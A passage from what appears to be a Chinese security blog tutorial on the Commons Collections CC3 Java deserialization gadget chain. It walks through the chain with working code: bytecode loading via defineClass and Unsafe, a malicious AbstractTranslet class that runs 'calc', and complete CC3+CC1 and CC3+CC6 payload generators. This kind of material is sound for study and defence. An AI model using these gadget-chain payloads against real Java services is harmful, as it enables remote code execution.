class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, IOException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        Method defineclass=ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineclass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] words = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">c</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">hello</span> <span class="operator">=</span> (Class) defineclass.invoke(c, <span class="string">&quot;org.example.Hello&quot;</span>, words, <span class="number">0</span>, words.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511204156647.png" alt="image-20240511204156647"></p><h2 id="Unsafe加载字节码"><a href="#Unsafe加载字节码" class="headerlink" title="Unsafe加载字节码"></a>Unsafe加载字节码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, IllegalAccessException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">byte</span>[] words = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">c</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) f.get(<span class="literal">null</span>);</span><br><span class="line">        Class&lt;?&gt; hello = unsafe.defineClass(<span class="string">&quot;org.example.Hello&quot;</span>, words, <span class="number">0</span>, words.length, c, <span class="literal">null</span>);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次我获取的是unsafe的属性，而不是<code>defineClass</code>方法，同样的unsafe类也有definclass方法，但是他是原生的类（底层C加载），因此反射过来无法调用, 因此我们需要先获取Unsafe对象，进而调用definclass方法，最后加载任意类从而实现命令执行</p><h2 id="链子分析-2"><a href="#链子分析-2" class="headerlink" title="链子分析"></a>链子分析</h2><p>CC3采用的是动态加载类，也就是上面讲基础时用到过的<code>ClassLoder.defineclass</code>,因此我们寻找谁调用了defineclass方法</p><p>在java核心库中, 在com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader里调用了:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511222124553.png" alt="image-20240511222124553"></p><p>继续跟进, 看看该类的哪里调用了defineclass</p><p>在<code>defineTransletClasses</code>中</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511222341863.png" alt="image-20240511222341863"></p><p>可以看见这里有调用, 但是必须绕过第一个判断, 我们翻上去看<code>_bytecodes</code>的默认值就是null, 因此需要反射赋值, 否则是无法执行到defineclass的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511222952049.png" alt="image-20240511222952049"></p><p>这里调用<code>_tfactory.getExternalExtensionsMap()</code>, 因此<code>_tfactory</code>也不能为空</p><p>不过好在在readObject中<code>_tfactory</code>会被自动赋值, 因此我们不必关心</p><p>继续看哪里调用了<code>defineTransletClasses</code></p><p>当前类中能够搜索到三处调用,  我们只关心<code>getTransletInstance</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511223533379.png" alt="image-20240511223533379"></p><p>这里的if判断依然是需要反射赋值,</p><p>继续跟进哪里调用了<code>getTransletInstance</code></p><p>只有一个<code>newTransformer</code>对其进行了调用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511223717794.png" alt="image-20240511223717794"></p><p>至此, 现在的思路就是实例化一个<code>TemplatesImpl</code>,然后调用它的<code>newTransformer</code>方法, 以此来达到加载任意类的目的</p><p>编写demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, bytes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519195412264.png" alt="image-20240519195412264"></p><p>运行会报错</p><p>这里大意了, 在类中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>一个是一个二维的数组</p><p>因此我们需要改写一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519201358854.png" alt="image-20240519201358854"></p><p>之后这里仍然会报错, 我们跟进调试一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519202511737.png" alt="image-20240519202511737"></p><p>问题出在了这里, 这里进入了419行, 将_transletIndex赋值成了小于一的数, 导致进入428行抛出错误</p><p>为了避免进入419行, 我们加载的类必须满足其继承<code>ABSTRACT_TRANSLET</code>这个类, 我们点进去可以看见</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519202807342.png" alt="image-20240519202807342"></p><p>因此我们只需要恶意继承一下即可</p><p>我们修改要加载的类为:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 继承AbstractTranslet必须重写以下方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译好后运行我们的demo,</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519203400370.png" alt="image-20240519203400370"></p><p>这里仍然会看到报错, 但是已经成功了!</p><p>但是目前这条链子仍然受限于需要newTransformer()的调用这一先决条件</p><p>我们可以使用CC1的链子来调用这个newTransformer()方法,从而触发任意类加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="comment">// templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;CC3.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC3.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接把之前的拼起来, 成功执行</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519205440576.png" alt="image-20240519205440576"></p><p>当然可以看配合CC6</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="comment">// templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;CC3.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC3.bin&quot;</span>));</span><br><span class="line">        